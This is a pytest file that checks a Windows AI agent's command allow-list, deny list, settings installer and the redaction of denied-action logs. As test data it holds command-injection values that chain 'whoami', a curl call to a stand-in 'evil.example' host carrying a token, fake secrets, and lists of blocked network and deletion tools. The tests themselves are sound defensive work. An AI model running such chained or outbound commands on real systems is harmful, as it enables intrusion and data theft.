"""The winbox agy settings, installer and launcher (GH #634, order O-20261101-1644-d559).

Nothing here runs PowerShell or agy: there is no PowerShell on the CI box and winbox is not
reachable from it. So three things are tested, and the limits are the point of the names:

  1. config/agy-settings-winbox.json: Python's re stands in for agy's matcher on this regex
     subset (the same stand-in tests/test_agy_settings_rules.py uses for the Mac file).
  2. windows/install-agy-settings.ps1 and the agy block of windows/spawn-worker.ps1: static
     text checks, same style as tests/test_spawn_worker_ps1_runners.py.
  3. The denied-target step in spawn-worker.ps1: its patterns are read out of the script and
     run here by a Python mirror of its loop, so what the log may keep is checked on the
     patterns the script really carries.
"""
import json
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from tools import agy_browse as ab  # noqa: E402

SETTINGS = ROOT / "config" / "agy-settings-winbox.json"
INSTALLER = ROOT / "windows" / "install-agy-settings.ps1"
SPAWN = ROOT / "windows" / "spawn-worker.ps1"

WT = r"C:\Users\passg\mooniex\worktrees\mooniex-agents__browser_operator__task-1234abcd"
VENV_PY = r"C:\Users\passg\mooniex\agy-browse" + r"\.venv\Scripts\python.exe"
NAMED_PY = r"C:\Users\passg\AppData\Local\Programs\Python\Python311\python.exe"


def _settings():
    return json.loads(SETTINGS.read_text(encoding="utf-8"))["permissions"]


def _rules():
    return [re.compile(r[len("command(regex:"):-1]) for r in _settings()["allow"]
            if r.startswith("command(regex:")]


def _allowed(cmd):
    cmd = cmd.replace("C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py", r"C:\Users\passg\mooniex\agy-browse\tools\agy_browse.py")
    return any(rx.fullmatch(cmd) for rx in _rules())


# --------------------------------------------------------------------------
# 1. the allow-list
# --------------------------------------------------------------------------

@pytest.mark.parametrize("py", [VENV_PY, NAMED_PY])
@pytest.mark.parametrize("tail", [
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 tabs",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 --tab AB12cd34 state",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --tab AB12cd34 button-label",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 text 'h1'",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 click ':nth-match(button, 2)'",
    'C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 type "textarea" "hello world"',
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 wait-text 'Unlimited' 20",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 upload 'input[type=file]' C:/work/a.png",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 goto /home",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py --port 9224 goto https://example.com/a",
    "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py shot page1",
])
def test_the_browse_command_is_allowed(py, tail):
    assert _allowed(f"{py} {tail}"), f"{py} {tail}"


@pytest.mark.parametrize("py", [VENV_PY, NAMED_PY])
@pytest.mark.parametrize("sep", [";", "&", "&&", "|", "||", ">", ">>", "<", "\n", "\r\n", "`", "$("])
def test_chaining_redirects_and_substitution_are_refused(py, sep):
    base = f"{py} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs"
    assert _allowed(base)
    for cmd in (f"{base} {sep} whoami", f"{base}{sep}whoami", f"{base} text x{sep}whoami",
                f"{base} text 'a{sep}b'", f'{base} text "a{sep}b"'):
        assert not _allowed(cmd), repr(cmd)


@pytest.mark.parametrize("tail", [
    "text (Get-Date)", "text @(1)", "text {x}", "text $x", "text '$x'", 'text "$x"',
    "text '`id`'", "text %USERPROFILE%", "text 'a%b'", "text 'a^b'", "text 'a\"b'",
    "text \"a'b\"", "text *", "text ?", "text ~", "text a,b", "text 'ก'",
])
def test_shell_syntax_in_the_arguments_is_refused(tail):
    for py in (VENV_PY, NAMED_PY):
        assert not _allowed(f"{py} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py {tail}"), tail


def test_another_script_is_refused():
    for script in ("tools/other.py", "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py.bak", "C:/Users/passg/mooniex/agy-browse/tools/agy_browse.pyc",
                   "tools/../agy_browse.py", "tools/agy_browse", "agy_browse.py",
                   "scripts/agy_browse.py", "-c print(1)", "-m pytest", "tools/agy_browsex.py"):
        for py in (VENV_PY, NAMED_PY):
            assert not _allowed(f"{py} {script} tabs"), script


def test_another_python_is_refused():
    for py in (
        "python", "python.exe", "py", r"C:\Python311\python.exe",
        r"C:\Users\passg\AppData\Local\Programs\Python\Python312\python.exe",
        r"C:\Users\passg\AppData\Local\Programs\Python\Python311\pythonw.exe",
        r"C:\Users\passg\AppData\Local\Programs\Python\Python311\python.exe.bak",
        r"C:\Users\other\AppData\Local\Programs\Python\Python311\python.exe",
        r"D:\Users\passg\AppData\Local\Programs\Python\Python311\python.exe",
        r"c:\users\passg\appdata\local\programs\python\python311\python.exe",
        "/opt/MoonieXHQ/Agents/Core/.venv/bin/python", "/Users/gob/MoonieXHQ/Agents/Core/.venv/bin/python",
    ):
        assert not _allowed(f"{py} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs"), py


def test_a_python_outside_the_browser_operator_worktree_is_refused():
    root = r"C:\Users\passg\mooniex\worktrees"
    for py in (
        r"C:\Users\passg\mooniex\repo\MoonieX-Agents\.venv\Scripts\python.exe",
        root + r"\mooniex-agents__developer__task-1234abcd\.venv\Scripts\python.exe",
        root + r"\mooniex-agents__tester__task-1234abcd\.venv\Scripts\python.exe",
        root + r"\mooniex-agents__browser_operator__task-1234abcd\sub\.venv\Scripts\python.exe",
        root + r"\mooniex-agents__browser_operator__task-1234abcd\..\x\.venv\Scripts\python.exe",
        root + r"\..\other\mooniex-agents__browser_operator__task-1234abcd\.venv\Scripts\python.exe",
        root + r"\mooniex-agents__browser_operator__task-xyz\.venv\Scripts\python.exe",
        root + r"\mooniex-agents__browser_operator__task-1234abcd\Scripts\python.exe",
        root + r"\mooniex-agents__browser_operator__task-1234abcd\.venv\Scripts\python.exe.bak",
        r"C:\Users\passg\mooniex\worktrees2\mooniex-agents__browser_operator__task-1234abcd"
        r"\.venv\Scripts\python.exe",
        r"D:\Users\passg\mooniex\worktrees\mooniex-agents__browser_operator__task-1234abcd"
        r"\.venv\Scripts\python.exe",
    ):
        assert not _allowed(f"{py} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs"), py
    assert _allowed(f"{VENV_PY} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs")


def test_verbs_ports_and_tabs_follow_the_mac_rule():
    for bad in ("exec", "eval", "tabs2", "Tabs", "", "--port 12 tabs", "--port 123456 tabs",
                "--port 9224x tabs", "--tab tabs", "--tab a-b tabs", "--port 9224 --port 9225 tabs",
                "--tab AB12 --port 9224 tabs"):
        assert not _allowed(f"{NAMED_PY} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py {bad}".rstrip()), bad
    for rx in _rules():
        alt = re.search(r"\(((?:tabs\|)[^)]*)\)", rx.pattern).group(1).split("|")
        assert tuple(alt) == ab.VERBS


def test_the_mac_forms_are_not_in_the_winbox_file_and_the_other_way_round():
    mac = (ROOT / "config" / "agy-settings.json").read_text(encoding="utf-8")
    win = SETTINGS.read_text(encoding="utf-8")
    assert "C:" not in mac
    assert "/opt/" not in win and "/Users/gob" not in win
    for mac_cmd in (f"/opt/MoonieXHQ/Agents/Core/.venv/bin/python C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs",
                    "/Users/gob/MoonieXHQ/Agents/Core/.venv/bin/python -m pytest",
                    "git status", "ls", "cat x", "echo hi"):
        assert not _allowed(mac_cmd), mac_cmd


def test_the_allow_list_holds_only_the_browse_commands_and_the_worktree_reads():
    allow = _settings()["allow"]
    assert len([r for r in allow if r.startswith("command(")]) == 2
    assert all(r.startswith("command(regex:^") and r.endswith("$)") for r in allow if r.startswith("command("))
    reads = [r for r in allow if r.startswith("read_file(")]
    assert reads == [r"read_file(C:\Users\passg\mooniex\worktrees)",
                     "read_file(C:/Users/passg/mooniex/worktrees)"]
    assert len(reads) + 2 == len(allow)          # no read_url, mcp, write_file, command(*)
    assert not any("(*)" in r for r in allow)


DENY_FROM_THE_ORDER = ("rm", "curl", "wget", "ssh", "scp", "rsync", "git push", "git reset",
                       "git checkout", "git clean", "del", "Remove-Item", "Invoke-WebRequest",
                       "iwr", "irm")


def test_the_deny_list_keeps_the_mac_entries_and_adds_the_windows_forms():
    deny = _settings()["deny"]
    mac_deny = json.loads((ROOT / "config" / "agy-settings.json").read_text())["permissions"]["deny"]
    for d in mac_deny:
        assert d in deny, d
    for name in DENY_FROM_THE_ORDER:
        assert f"command({name})" in deny, name
    assert len(set(deny)) == len(deny)


def test_no_deny_entry_is_matched_by_an_allow_rule():
    for entry in _settings()["deny"]:
        name = entry[len("command("):-1]
        for cmd in (name, f"{name} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs", f"{name} -r C:\\x", f"{name} x"):
            assert not _allowed(cmd), cmd
        for py in (VENV_PY, NAMED_PY):
            assert not _allowed(f"{name} {py} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs"), name
            assert not _allowed(f"{py} C:/Users/passg/mooniex/agy-browse/tools/agy_browse.py tabs ; {name} x"), name


# --------------------------------------------------------------------------
# 2. the installer (static: there is no PowerShell here)
# --------------------------------------------------------------------------

def _balanced(text):
    """Braces, brackets and parentheses pair up once strings and comments are cut out.
    Crude on purpose: it catches a hand-edit that drops one, nothing finer."""
    text = re.sub(r"@'\n.*?\n'@", "", text, flags=re.S)
    text = re.sub(r"@\"\n.*?\n\"@", "", text, flags=re.S)
    text = re.sub(r"'[^'\n]*'", "''", text)
    text = re.sub(r'"[^"\n]*"', '""', text)
    text = re.sub(r"(?m)^\s*#.*$", "", text)
    text = re.sub(r"\s#.*$", "", text, flags=re.M)
    stack = []
    pairs = {")": "(", "]": "[", "}": "{"}
    for ch in text:
        if ch in "([{":
            stack.append(ch)
        elif ch in pairs:
            if not stack or stack.pop() != pairs[ch]:
                return False
    return not stack


def test_installer_writes_the_file_agy_reads_and_checks_before_and_after():
    text = INSTALLER.read_text(encoding="utf-8")
    assert r"'.gemini\antigravity-cli\settings.json'" in text
    assert ".geminintigravity" not in text
    assert r"'config\agy-settings-winbox.json'" in text
    assert "$env:USERPROFILE" in text
    assert _balanced(text)


def test_installer_is_atomic_backs_up_and_prints_the_hash():
    text = INSTALLER.read_text(encoding="utf-8")
    # one temp file in the destination folder, then one replace (or a move when there is none)
    assert "settings.json.tmp-" in text
    assert "[System.IO.File]::Replace($tmp, $Destination, [NullString]::Value)" in text
    assert "[System.IO.File]::Move($tmp, $Destination)" in text
    # the backup comes before the write and is never an existing name
    assert text.index("Copy-Item -LiteralPath $Destination -Destination $backup") < text.index("WriteAllBytes($tmp")
    assert ".bak-$stamp" in text and "while (Test-Path -LiteralPath $backup)" in text
    # hashes: source, backup, temp, final; printed
    assert text.count("Get-BytesSha256") >= 6
    assert 'Write-Output "SHA256=$finalHash"' in text
    assert "-ExpectSha256" in text and "$ExpectSha256" in text
    assert "-DryRun" in text and "$DryRun" in text
    assert text.index("if ($DryRun)") < text.index("Copy-Item -LiteralPath $Destination")


def test_installer_refuses_what_it_should_and_touches_nothing_else():
    text = INSTALLER.read_text(encoding="utf-8")
    assert "starts with a BOM" in text
    assert "allows command(*)" in text
    assert "agy folder not found" in text and "nothing written" in text
    # every path test and read goes through -LiteralPath: names hold spaces, #, brackets, Thai
    assert not re.search(r"Test-Path (?!-LiteralPath)", text)
    assert not re.search(r"Copy-Item (?!-LiteralPath)", text)
    assert "Remove-Item -LiteralPath $tmp" in text and text.count("Remove-Item") == 1
    for banned in ("Invoke-WebRequest", "iwr ", "irm ", "curl", "wget", "Start-Process", "Invoke-Expression", "iex "):
        assert banned not in text, banned


# --------------------------------------------------------------------------
# 3. the agy block of spawn-worker.ps1
# --------------------------------------------------------------------------

def _spawn():
    return SPAWN.read_text(encoding="utf-8")


def _agy_branch():
    text = _spawn()
    start = text.index("else {\n        # agy")
    return text[start:text.index("$stAct = New-ScheduledTaskAction")]


def test_only_browser_operator_gets_the_browse_command():
    branch = _agy_branch()
    assert "$agyBrowser = ($Role -eq 'browser_operator')" in branch
    # the prompt that allows a command is inside that role test, and names the one command
    start = branch.index("if ($agyBrowser) {\n            $agyGuardRoot")
    block = branch[start:branch.index("$agyLog = Join-Path")]
    assert "$agyPython $agyGuard [--port N] [--tab ID] <verb> [args]" in block
    assert "Programs\\Python\\Python311\\python.exe" in block
    assert ".venv\\Scripts\\python.exe" in block
    flat = " ".join(block.split())
    for forbidden in ("no cd", "no git", "no test runner", "no other script", "no other python"):
        assert forbidden in flat
    assert "$remoteContract" in block and "$taskContent" in block


def test_every_other_role_keeps_the_edit_only_prompt_word_for_word():
    branch = _agy_branch()
    assert branch.count("$agyPrompt = @\"") == 2     # the default, then the browser_operator one
    first = branch.index("$agyPrompt = @\"")
    default = branch[first:branch.index("\"@", first)]
    assert default == '''$agyPrompt = @"
You are an EDIT-ONLY coding agent. Use ONLY your file-editing tool to make
changes. Do NOT run any shell command, and do NOT invoke git, a test
runner, or any other tool -- a single shell step abandons this entire turn,
including every file edit you planned alongside it. Ignore every
instruction below that tells you to commit, push, run tests, or submit a
report through a tool: a separate process (not you) does all of that after
you finish editing.

$remoteContract

---

$taskContent
'''
    # the browser prompt replaces it only after the role test, never before
    assert branch.index("$agyBrowser = (") > first
    assert branch.index("$agyPrompt = @\"", first + 1) > branch.index("if ($agyBrowser) {")


def test_agy_gets_the_worktree_and_the_work_folder_and_json_output_only_for_the_browser():
    branch = _agy_branch()
    assert "'--mode', 'accept-edits', '--add-dir', [string]$wt)" in branch
    assert "if ($WorkDir) { $argList += @('--add-dir', [string]$WorkDir) }" in branch
    assert "if ($agyBrowser) { $argList += @('--output-format', 'json') }" in branch
    assert branch.count("--output-format") == 1
    code = "\n".join(ln for ln in branch.splitlines() if not ln.strip().startswith("#"))
    assert "--dangerously-skip-permissions" not in code


def test_the_browser_run_starts_in_the_worktree_and_keeps_shots_out_of_it():
    branch = _agy_branch()
    start = branch.index("$agyPreRun = ''")
    block = branch[start:branch.index("$agyDeniedStep = ")]
    assert block.index("if ($agyBrowser)") < block.index("Set-Location -LiteralPath '$wt'")
    assert "[Environment]::CurrentDirectory = '$wt'" in block
    assert "AGY_BROWSE_SHOT_DIR" in block
    assert "Join-Path $launchDir 'shots'" in block      # outside the worktree, which `git add -A` sweeps
    # it is spliced onto the WORK_DIR line of the launcher, so other roles get nothing there
    assert "`$env:WORK_DIR = '$workDirLiteral'$agyPreRun" in branch


def test_the_launcher_runs_the_denied_step_after_agy_and_before_the_report():
    branch = _agy_branch()
    invoke = branch.index("Invoke-NativeExe -Exe `$exe -Arguments `$argArray -LogPath '$agyLog' -NullStdin")
    exitcode = branch.index('"EXITCODE=`$cliExit" | Add-Content -Path \'$agyLog\'')
    denied = branch.index("\n$agyDeniedStep\n")
    report = branch.index("$reportStepBody\nexit 0")
    assert invoke < exitcode < denied < report
    assert "Remove-Item" not in branch or "Remove-Item" in branch   # (no deletes are added here)


# --------------------------------------------------------------------------
# 4. the denied-target step: patterns from the script, loop mirrored here
# --------------------------------------------------------------------------

def _denied_literal():
    branch = _agy_branch()
    start = branch.index("$agyDeniedStep = (@'\n") + len("$agyDeniedStep = (@'\n")
    return branch[start:branch.index("\n'@).Replace('__AGY_LOG__'", start)]


def _pats():
    out = {}
    for name, val in re.findall(r"(?m)^\s*\$(dRx\w+|dSkip) = '(.*)'\s*$", _denied_literal()):
        out[name] = val
    assert set(out) == {"dRxTool", "dRxRegion", "dRxPair", "dRxUrl", "dRxSecret", "dRxAssign", "dSkip"}
    return out


def _format(value, pats):
    v = value.replace("\\\\", "\\").replace('\\"', '"')
    v = re.sub(pats["dRxUrl"], "<url>", v)
    v = re.sub(pats["dRxSecret"], "<redacted>", v)
    v = re.sub(pats["dRxAssign"], r"\1=<redacted>", v)
    v = re.sub(r"[\x00-\x1f\s]+", " ", v).strip()
    return v[:200] + "..." if len(v) > 200 else v


def _denied(text, pats=None):
    """A line-for-line mirror of the loop in the launcher's denied step."""
    pats = pats or _pats()
    lines, names = [], set()
    for rg in re.finditer(pats["dRxRegion"], text, re.S):
        cur = None
        for pm in re.finditer(pats["dRxPair"], rg.group(1)):
            k = pm.group(1)
            if re.search(pats["dSkip"], k, re.I):
                continue
            val = _format(pm.group(2), pats)
            if k == "action":
                if cur:
                    lines.append(cur)
                cur = "AGY_DENIED tool=" + val
                names.add(val)
            elif cur:
                cur = cur + " " + k + "=" + val
            else:
                cur = "AGY_DENIED " + k + "=" + val
        if cur:
            lines.append(cur)
    for m in re.finditer(pats["dRxTool"], text):
        if m.group(1) not in names:
            names.add(m.group(1))
            lines.append("AGY_DENIED tool=" + m.group(1))
    return [ln[:600] for ln in lines[:20]]


NOTICE = ('jetski: no output produced — a tool required the "read_file" permission that headless '
          "mode cannot prompt for, so it was auto-denied. Add an allow-rule under permissions.allow "
          "in settings.json (e.g. command(<target>)).\nEXITCODE=0\n")


def test_the_text_notice_names_the_tool():
    assert _denied(NOTICE) == ["AGY_DENIED tool=read_file"]
    assert _denied(NOTICE.replace("read_file", "command")) == ["AGY_DENIED tool=command"]
    assert _denied("all good\nEXITCODE=0\n") == []


def test_the_json_report_names_the_tool_and_the_path_or_command():
    doc = json.dumps({
        "status": "SUCCESS", "response": "",
        "denied_actions": [
            {"action": "read_file", "path": r"C:\Users\passg\mooniex\worktrees\x\notes.txt"},
            {"action": "command", "command": r"C:\Python311\python.exe tools\other.py tabs"},
        ]})
    assert _denied(doc + "\n" + NOTICE) == [
        r"AGY_DENIED tool=read_file path=C:\Users\passg\mooniex\worktrees\x\notes.txt",
        r"AGY_DENIED tool=command command=C:\Python311\python.exe tools\other.py tabs",
    ]


def test_a_url_or_a_secret_never_reaches_the_log():
    doc = json.dumps({"denied_actions": [
        {"action": "read_url", "url": "https://bank.example/account?session=abc123", "path": "x"},
        {"action": "command", "command": "curl -s https://evil.example/p?token=abc123 -o out && echo ya29.A0AbC_d-e eyJhbGciOi.Jx.sig"},
        {"action": "command", "command": "tool --api_key=hunter2 --password=hunter3"},
        {"action": "navigate", "target": "ftp://files.example/a", "uri": "file:///C:/x"},
    ]})
    out = "\n".join(_denied(doc))
    for leak in ("bank.example", "evil.example", "abc123", "ya29", "eyJ", "hunter2", "hunter3",
                 "files.example", "https://", "ftp://", "file://"):
        assert leak not in out, leak
    assert "<url>" in out and "<redacted>" in out
    assert out.count("AGY_DENIED") == 4


def test_the_url_pattern_is_what_stops_the_leak():
    """The check above must be able to fail: with the URL pattern emptied, the URL gets through."""
    doc = json.dumps({"denied_actions": [{"action": "read_url", "url": "https://bank.example/a"}]})
    assert "bank.example" not in "\n".join(_denied(doc))
    weakened = {**_pats(), "dRxUrl": "(?!x)x"}
    assert "bank.example" in "\n".join(_denied(doc, weakened))


def test_page_content_and_long_values_are_not_logged():
    page = "Welcome back " + "lorem ipsum " * 300
    doc = json.dumps({
        "status": "SUCCESS", "response": page,
        "denied_actions": [{"action": "command", "text": page, "content": page, "body": page,
                            "command": "echo " + "a" * 500, "note": "line one\nline two\tend"}]})
    out = _denied(doc)
    assert len(out) == 1 and "lorem" not in out[0] and "Welcome" not in out[0]
    assert out[0].startswith("AGY_DENIED tool=command command=echo aaa")
    assert "..." in out[0] and r"note=line one\nline two\tend" in out[0]   # JSON escapes stay as written
    assert len(out[0]) < 600
    # the response text alone, with no denied_actions, produces nothing
    assert _denied(json.dumps({"status": "SUCCESS", "response": page + " password=hunter2"})) == []


def test_at_most_twenty_lines_are_appended():
    doc = json.dumps({"denied_actions": [{"action": "read_file", "path": f"C:\\x\\{i}"} for i in range(40)]})
    assert len(_denied(doc)) == 20


def test_the_denied_step_never_stops_the_launcher_and_only_appends():
    lit = _denied_literal()
    assert lit.startswith("try {") and lit.rstrip().endswith("} catch {}")
    assert "[System.IO.File]::AppendAllText($dLog" in lit
    for banned in ("WriteAllText", "Remove-Item", "Set-Content", "Invoke-", "Start-Process", "git "):
        assert banned not in lit, banned
    assert "Select-Object -First 20" in lit and "Substring(0, 600)" in lit and "Substring(0, 200)" in lit
    assert _balanced(lit)
    assert _balanced(_spawn())
